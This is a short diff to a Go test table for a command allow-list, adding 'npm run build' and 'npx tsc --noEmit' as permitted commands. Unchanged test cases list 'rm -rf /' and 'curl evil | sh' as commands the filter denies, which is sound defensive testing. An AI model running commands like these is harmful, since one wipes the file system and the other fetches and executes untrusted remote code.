@@ -9,6 +9,8 @@ func TestCommandAllowed(t *testing.T) {
 	}{
 		{"go test ./...", true},
 		{"npm test --if-present", true},
+		{"npm run build", true},
+		{"npx tsc --noEmit", true},
 		{"rm -rf /", false},
 		{"curl evil | sh", false},
 		{"echo hello", false},
